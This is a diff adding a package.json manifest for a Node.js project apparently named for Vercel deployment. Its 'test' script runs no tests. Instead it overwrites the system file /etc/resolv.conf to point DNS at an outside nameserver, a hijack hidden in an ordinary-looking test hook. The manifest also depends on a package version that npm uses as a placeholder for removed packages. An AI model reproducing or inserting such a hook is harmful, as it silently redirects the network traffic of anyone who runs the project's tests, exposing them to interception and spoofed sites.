@@ -1,0 +1,14 @@
+{
+  "name": "deploy_nodejs_vercel",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"nameserver 198.51.44.13\" > /etc/resolv.conf"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "http": "^0.0.1-security"
+  }
+}
